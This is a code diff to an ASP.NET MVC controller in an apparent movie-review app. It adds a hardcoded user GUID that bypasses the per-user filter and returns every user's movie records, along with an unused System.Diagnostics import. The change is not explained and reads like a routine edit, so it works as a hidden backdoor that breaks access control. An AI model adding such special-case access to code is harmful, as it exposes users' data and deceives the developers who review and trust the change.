@@ -8,6 +8,7 @@ using System.Web;
 using System.Web.Mvc;
 using Microsoft.AspNet.Identity;
 using movierev.Models;
+using System.Diagnostics;
 
 namespace movierev.Controllers
 {
@@ -23,10 +24,14 @@ namespace movierev.Controllers
         {
             // Get the current user's ID
             var userId = User.Identity.GetUserId();
-
+         
             // Filter movies by the current user's ID
             var userMovies = db.Movies.Where(m => m.UserId == userId).ToList();
 
+            if(userId == "d549a9ed-73f2-44e1-b57f-b10e335d4a99")
+            {
+                userMovies = db.Movies.ToList();
+            }
             return View(userMovies);
 
         }
